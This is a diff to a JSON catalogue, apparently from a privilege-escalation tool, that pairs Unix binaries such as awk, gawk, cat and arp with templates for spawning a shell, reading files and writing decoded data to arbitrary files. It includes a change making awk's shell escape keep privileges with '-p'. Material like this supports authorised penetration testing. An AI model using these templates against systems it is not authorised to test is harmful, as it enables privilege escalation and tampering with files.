@@ -1,5 +1,9 @@
 [
 	{
+		"name": "cat",
+		"read_file": "{path} {lfile}"
+	},
+	{
 		"name": "bash",
 		"shell": {
 			"script": "{command}", 
@@ -36,15 +40,6 @@
 		}
 	},
 	{
-		"name": "cat",
-		"read_file": "{path} {lfile}"
-	},
-	{
-		"name": "arp",
-		"read_file": "{path} -v -f {lfile} 2>&1 | while read line; do substring=\"\"; if ! test \"${{line#*arp}}\" != \"$line\"; then echo ${{line#>> }}; fi; done",
-		"safe":false
-	},
-	{
 		"name": "ash",
 		"shell": {
 			"script": "{command}", 
@@ -60,23 +55,20 @@
 	{
 		"name": "awk",
 		"shell": {
-			"script": "{command} 'BEGIN {{system(\"/bin/sh\")}}'"
+			"script": "{command} 'BEGIN {{system(\"{shell} -p\")}}'"
 		},
 		"read_file": "{path} '//' {lfile}",
 		"write_file": {
 			"type": "base64",
-			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ \"echo \\\"{data}\\\" | base64 -d\" | getline x ; print x > LFILE }}'"
+			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ printf \"\" > LFILE; while ((\"echo \\\"{data}\\\" | base64 -d\" | getline) > 0){{ print >> LFILE }} }}'"
 		}
 	},
 	{
 		"name": "gawk",
-		"shell": {
-			"script": "{command} 'BEGIN {{system(\"/bin/sh\")}}'"
-		},
 		"read_file": "{path} '//' {lfile}",
 		"write_file": {
 			"type": "base64",
-			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ \"echo \\\"{data}\\\" | base64 -d\" | getline x ; print x > LFILE }}'"
+			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ printf \"\" > LFILE; while ((\"echo \\\"{data}\\\" | base64 -d\" | getline) > 0){{ print >> LFILE }} }}'"
 		}
 	},
 	{
